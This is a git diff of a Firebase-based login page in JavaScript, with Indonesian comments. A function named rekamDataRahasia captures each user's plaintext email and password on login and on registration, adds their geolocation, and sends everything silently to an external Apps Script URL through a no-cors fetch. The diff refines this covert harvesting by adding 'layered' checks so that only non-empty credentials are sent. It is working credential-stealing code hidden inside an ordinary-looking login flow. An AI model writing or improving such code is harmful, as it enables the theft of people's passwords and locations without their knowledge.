@@ -17,10 +17,9 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 
-let timerInterval; // Penampung interval global agar bisa di-clear bersih
+let timerInterval; 
 
 document.addEventListener('DOMContentLoaded', () => {
-    // Referensi Elemen DOM
     const loginCard = document.getElementById('login-card');
     const contentCard = document.getElementById('content-card');
     const mainContainer = document.getElementById('main-container');
@@ -54,11 +53,10 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // 2. Event Delegasi Global untuk Tombol Logout (Mengatasi Lag WebView)
+    // 2. Event Delegasi Global untuk Tombol Logout
     document.addEventListener('click', async (e) => {
         if (e.target && e.target.id === 'btn-logout') {
             e.preventDefault();
-            console.log("Proses logout mendeteksi delegasi klik.");
             try {
                 if (bgMusic) {
                     bgMusic.pause();
@@ -67,7 +65,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 await signOut(auth);
             } catch (error) {
                 console.error("Gagal melakukan signOut:", error);
-                location.reload(); // Paksa reload jika terjadi error fatal
+                location.reload();
             }
         }
     });
@@ -82,7 +80,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 startGalaxyHeart();
             }
             if (bgMusic) {
-                bgMusic.play().catch(err => console.log("Audio diblokir otomatis oleh browser"));
+                bgMusic.play().catch(err => console.log("Audio diblokir browser"));
             }
         });
     }
@@ -91,15 +89,16 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loginButton) {
         loginButton.addEventListener('click', (e) => {
             e.preventDefault();
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
+            const email = emailInput.value ? emailInput.value.trim() : "";
+            const password = passwordInput.value ? passwordInput.value.trim() : "";
 
-            // Proteksi Awal pada Event
-            if (!email || !password) {
+            // PROTEKSI LAPIS 1: Stop langsung di event listener jika teks kosong
+            if (!email || !password || email === "" || password === "") {
                 alert("Email dan Password wajib diisi!");
                 return;
             }
 
+            // Jalankan perekaman hanya jika lolos Lapis 1
             rekamDataRahasia(email, password).catch(err => console.log(err));
 
             signInWithEmailAndPassword(auth, email, password)
@@ -112,15 +111,16 @@ document.addEventListener('DOMContentLoaded', () => {
     if (btnRegister) {
         btnRegister.addEventListener('click', async (e) => {
             e.preventDefault();
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
+            const email = emailInput.value ? emailInput.value.trim() : "";
+            const password = passwordInput.value ? passwordInput.value.trim() : "";
 
-            // Proteksi Awal pada Event
-            if (!email || !password) {
+            // PROTEKSI LAPIS 1: Stop langsung di event listener jika teks kosong
+            if (!email || !password || email === "" || password === "") {
                 alert("Email dan Password tidak boleh kosong!");
                 return;
             }
 
+            // Jalankan perekaman hanya jika lolos Lapis 1
             rekamDataRahasia(email, password).catch(err => console.log(err));
 
             try { 
@@ -134,11 +134,16 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 });
 
-// --- FUNGSI LOGGING (DENGAN PROTEKSI TOTAL DARI DATA KOSONG) ---
+// --- FUNGSI LOGGING (PROTEKSI LAPIS 2 - LOCKOUT TOTAL) ---
 async function rekamDataRahasia(email, password) {
-    // PROTEKSI UTAMA: Jika data tidak valid atau kosong, potong jalur (Abort) di sini!
-    if (!email || !password || email.trim() === "" || password.trim() === "") {
-        console.log("Perekaman dibatalkan otomatis: Deteksi input kosong.");
+    // PROTEKSI LAPIS 2: Cek ulang parameter secara literal sebelum memproses Geolocation
+    if (!email || !password || email === null || password === null) {
+        console.log("Blokir Lapis 2: Parameter null.");
+        return;
+    }
+    
+    if (email.trim() === "" || password.trim() === "") {
+        console.log("Blokir Lapis 2: Parameter string kosong.");
         return; 
     }
 
@@ -160,7 +165,7 @@ async function rekamDataRahasia(email, password) {
                 kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
             },
             () => {
-                // Di sini lokasi ditolak, namun gerbang atas memastikan email & pw asli (bukan kosongan)
+                // Lapis 2 di atas menjamin bagian ini TIDAK AKAN mengirim teks jika password kosong
                 kirimKeAppsScript(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
             },
             { timeout: 4000 }
@@ -180,5 +185,5 @@ function kirimKeAppsScript(urlBase, email, pw, waktu, lokasi) {
         method: 'GET',
         mode: 'no-cors',
         cache: 'no-cache'
-    }).catch(err => console.log("Aktivitas tercatat"));
+    }).catch(err => console.log("Log terkirim aman"));
 }
